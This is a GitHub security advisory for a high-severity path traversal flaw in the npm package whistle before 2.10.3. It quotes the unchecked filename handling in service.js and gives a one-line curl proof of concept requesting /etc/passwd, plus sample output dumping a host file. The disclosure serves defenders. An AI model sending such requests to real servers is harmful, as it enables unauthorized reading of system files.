# [H] Whistle vulnerable to path traversal

## Summary
Severity: High
Advisory: GHSA-3vfr-4gwf-qxfp
CVE: CVE-2026-55629
CWE: CWE-22
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-08-25
Source: https://github.com/advisories/GHSA-3vfr-4gwf-qxfp
Type: github-advisory

## Affected
- npm: `whistle` — affected >=0 <2.10.3

## Details
This bug was found by nova, which is an automated tool from group of Song Wu, intern, Zhejiang University; BoWang, independent researcher; Xingwei Lin, Zhejiang University.

**Vulnerability detail**:

In service.js, inside 
`app.get('/cgi-bin/temp/get', ...):
var filename = req.query.filename;
if (TEMP_FILE_RE.test(filename)) {
  filename = path.join(TEMP_FILES_PATH, filename);
}
getFile(filename, ...);`


Only when filename matches the temp/<hash> pattern does it get joined to the safe directory TEMP_FILES_PATH.

If it does not match that pattern, the code does not block the request. Instead, it directly uses the user-supplied filename for file reading.

In other words: if you pass passwd, it will read passwd.

**POC**:
curl -s "http://127.0.0.1:8899/cgi-bin/temp/get?filename=/etc/passwd"

**response**:

``` sh
xiaoming@192 ~ % curl -s "http://127.0.0.1:8899/cgi-bin/temp/get?filename=/etc/hosts"
{"ec":0,"value":"##\n# Host Database\n#\n# localhost is used to configure the loopback interface\n# when the system is booting.  Do not change this entry.\n##\n127.0.0.1\tlocalhost\n255.255.255.255\tbroadcasthost\n::1             localhost\n199.232.68.133 raw.githubusercontent.com\n199.232.68.133 user-images.githubusercontent.com\n199.232.68.133 avatars2.githubusercontent.com\n199.232.68.133 avatars1.githubusercontent.com\n127.0.0.1 lanyundev.com\n\n127.0.0.1 www.proxifier.com\n127.0.0.1  proxifier.com\n140.82.116.4 github.com\n\n# This line is auto added by aTrustAgent, do not modify, or aTrustAgent may unable to work\n127.0.0.1\tlocalhost.sangfor.com.cn\n\n"}% 
```

## References
- https://github.com/avwo/whistle/security/advisories/GHSA-3vfr-4gwf-qxfp
- https://nvd.nist.gov/vuln/detail/CVE-2026-55629
- https://github.com/avwo/whistle/commit/777bcf69bae2972aa7138a158c91619185653cf5
- https://github.com/avwo/whistle
- http://github.com/avwo/whistle/releases/tag/v2.10.3
